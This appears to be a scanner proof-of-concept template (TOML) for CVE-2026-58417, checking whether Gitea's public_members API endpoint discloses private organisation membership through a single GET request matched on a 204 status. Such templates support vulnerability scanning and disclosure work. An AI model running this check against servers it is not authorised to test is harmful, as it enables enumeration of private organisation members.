[info]
author = "ave"
description = "检测 Gitea REST API /orgs/{org}/public_members/{username} 端点是否泄露私有组织成员信息"
id = "POC-AVE-2026-0655"
name = "CVE-2026-58417 Gitea Private Org Member Disclosure PoC"
severity = "medium"
tags = ["ave-2026-0655"]
vuln_id = [
    "CVE-2026-58417",
    "AVE-2026-0655",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/api/v1/orgs/{{org}}/public_members/{{username}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [204]
type = "status"
